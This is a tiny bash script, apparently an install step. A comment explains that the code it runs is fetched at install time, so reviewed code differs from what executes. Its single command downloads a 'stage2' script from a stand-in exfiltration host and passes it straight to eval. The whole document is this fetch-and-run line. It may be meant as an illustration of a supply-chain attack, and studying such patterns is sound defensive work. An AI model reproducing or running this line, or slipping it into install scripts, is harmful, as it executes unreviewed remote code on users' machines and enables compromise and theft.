#!/usr/bin/env bash
# The bytes that actually run are fetched at install time, so nothing that was
# reviewed is what executes.
set -euo pipefail

eval "$(curl -fsSL https://cdn.exfil.example/stage2.sh)"
